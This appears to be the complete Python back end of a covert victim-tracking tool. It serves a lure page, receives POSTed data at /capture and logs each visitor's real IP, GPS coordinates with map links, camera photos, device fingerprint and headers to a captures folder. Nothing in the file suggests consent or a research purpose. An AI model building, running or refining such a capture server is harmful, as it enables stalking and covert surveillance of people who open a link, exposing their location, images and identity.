import http.server, socketserver, json, base64, os, sys, datetime

HERE = os.path.dirname(os.path.abspath(__file__))
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
OUT  = os.path.join(HERE, "captures")
B, Y, C, G, D, R = "\033[1m", "\033[33m", "\033[36m", "\033[32m", "\033[2m", "\033[0m"

ORDER = [
 ("Model","model"),("Model (UA)","model_guess"),("Platform","platform"),("Android ver","platformVersion"),
 ("Battery","battery_label"),("Battery %","battery_pct"),("Charging","battery_charging"),
 ("Charge time","battery_charging_time"),("Discharge time","battery_discharging_time"),
 ("Latitude","lat"),("Longitude","lng"),("Accuracy (m)","accuracy_m"),("Altitude","altitude"),
 ("Geo error","geo_error"),("MAPS LINK","maps_link"),
 ("Local LAN IP","local_ip"),("Network","net_type"),("Downlink","net_downlink"),("RTT","net_rtt"),
 ("Screen","screen"),("Viewport","viewport"),("DPR","dpr"),("Orientation","orientation"),
 ("Timezone","tz"),("Locale","locale"),("Language","language"),("Languages","langs"),
 ("Cores","cores"),("RAM (GB)","memory_gb"),("Touch pts","touch"),("GPU","gpu"),
 ("GPU vendor","gpu_vendor"),("Canvas FP","canvas_fp"),("Cameras","cameras"),("Mics","mics"),
 ("Speakers","speakers"),("Perm geo","perm_geolocation"),("Perm cam","perm_camera"),
 ("Storage quota","storage_quota"),("Storage used","storage_used"),("Path","path"),
 ("Referrer","referrer"),("Device time","time"),
]

class H(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *a): pass

    def do_GET(self):
        if self.path == "/favicon.ico":
            self.send_response(204); self.end_headers(); return
        body = open(os.path.join(HERE, "index.html"), "rb").read()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Cache-Control", "no-store")
        self.end_headers(); self.wfile.write(body)

    def do_POST(self):
        if self.path != "/capture":
            self.send_response(404); self.end_headers(); return
        n = int(self.headers.get("Content-Length", 0))
        try: j = json.loads(self.rfile.read(n))
        except Exception: j = {}

        h = {k.lower(): v for k, v in self.headers.items()}
        ip = (h.get("cf-connecting-ip") or h.get("x-real-ip")
              or h.get("x-forwarded-for", "").split(",")[0].strip()
              or self.client_address[0])
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        os.makedirs(OUT, exist_ok=True)

        files = []
        for i, img in enumerate(j.pop("images", []) or []):
            if img and "," in img:
                p = os.path.join(OUT, "%s_%d.jpg" % (ts, i))
                open(p, "wb").write(base64.b64decode(img.split(",", 1)[1]))
                files.append(p)

        j["ip"] = ip
        j["cf_country"] = h.get("cf-ipcountry")
        j["all_headers"] = h
        j["server_time"] = ts
        json.dump(j, open(os.path.join(OUT, ts + ".json"), "w"), indent=2)

        info = j.get("info") or {}
        L = [B + "=" * 64 + R, B + "  CAPTURE " + ts + R, B + "=" * 64 + R,
             C + "IP ADDRESS   : " + R + B + str(ip) + R + "   country=" + str(j.get("cf_country"))]
        lat, lng = info.get("lat"), info.get("lng")
        if lat is not None and lng is not None:
            L.append(G + "COORDINATES  : " + R + B + "%.6f, %.6f" % (lat, lng) + R +
                     "   +/- %sm" % info.get("accuracy_m"))
            L.append(G + "MAPS         : " + R + Y + "https://www.google.com/maps?q=%.6f,%.6f" % (lat, lng) + R)
            L.append(G + "OSM          : " + R + "https://www.openstreetmap.org/?mlat=%.6f&mlon=%.6f#map=17/%.6f/%.6f" % (lat, lng, lat, lng))
        else:
            L.append(R + "COORDINATES  : denied / unavailable (" + str(info.get("geo_error")) + ")" + R)
        for label, key in ORDER:
            if key in ("lat","lng","accuracy_m","maps_link","geo_error"): continue
            v = info.get(key)
            if v is None or v == "": continue
            L.append("  %-14s: %s" % (label, v))
        L.append("")
        L.append(D + "  user-agent   : " + str(info.get("ua")) + R)
        if files: L.append(G + "  photos       : " + ", ".join(files) + R)
        L.append(D + "  record       : " + os.path.join(OUT, ts + ".json") + R)
        L.append(B + "-" * 64 + R)
        block = "\n".join(L)
        print("\n" + block, flush=True)
        open(os.path.join(OUT, "latest.txt"), "w").write(block)

        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers(); self.wfile.write(b"ok")

socketserver.TCPServer.allow_reuse_address = True
socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
